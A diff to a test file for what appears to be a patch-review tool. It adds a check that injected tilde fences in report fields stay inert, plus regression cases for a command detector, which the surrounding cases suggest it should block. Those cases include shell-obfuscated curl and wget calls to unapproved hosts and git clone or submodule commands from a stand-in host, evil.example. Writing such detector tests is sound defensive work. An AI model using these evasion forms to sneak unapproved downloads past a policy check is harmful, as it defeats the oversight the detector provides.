@@ -1,4 +1,5 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
+import MarkdownIt from "markdown-it";
 import {
   mkdtemp,
   mkdir,
@@ -715,6 +716,31 @@ describe("patch approval and recovery", () => {
     expect(patches[0].after).toContain("---\nold-command\n<!--more-->");
     expect(patches[0].after).toContain("```sh\nnew-command\n```");
   });
+  it.each(["reason", "context", "original", "replacement", "section"])(
+    "keeps tilde fences inert in report %s fields",
+    async (field) => {
+      const { run } = await fixture();
+      run.findings = [
+        {
+          ...finding(run),
+          id: "first",
+          evidence: [],
+          [field]: "Before\n~~~\nInjected\n",
+        },
+        { ...finding(run), id: "second", evidence: [] },
+      ];
+      const markdown = new MarkdownIt();
+      const text = report(run, policy);
+      const tokens = markdown.parse(text, {});
+      expect(tokens.filter((token) => token.type === "fence")).toHaveLength(0);
+      expect(
+        tokens.filter(
+          (token) => token.type === "heading_open" && token.tag === "h2",
+        ),
+      ).toHaveLength(2);
+      expect(markdown.render(text)).toContain("~~~");
+    },
+  );
   it("escapes hostile report text", async () => {
     const { run } = await fixture();
     run.findings = [
@@ -877,6 +903,12 @@ describe("review regressions", () => {
     'c$"ur"l docs.example.com/guide',
     '$"wget" docs.example.com/guide',
     "c{ur,x}l docs.example.com/guide",
+    "git clone git@evil.example:org/repo.git",
+    "git clone evil.example:org/repo.git",
+    "git fetch git@server:org/repo.git",
+    "git remote add upstream git@evil.example:org/repo.git",
+    "git submodule add git@evil.example:org/repo.git",
+    "sh -c 'git clone git@evil.example:org/repo.git'",
     "result=$(c{ur,ur}l unapproved.example)",
     "echo $(c{ur,x}l unapproved.example)",
     `curl ${sourceUrl} --output >(c{ur,x}l unapproved.example)`,
@@ -938,6 +970,7 @@ describe("review regressions", () => {
   );
   it.each([
     `curl -fsSL ${sourceUrl}`,
+    `git clone ${sourceUrl}`,
     `curl -o "downloads/out.ps1" -H "Content-Type:application/json" ${sourceUrl}`,
     `curl ${sourceUrl} -o out.txt`,
     `curl --url=${sourceUrl} --output=out.txt`,
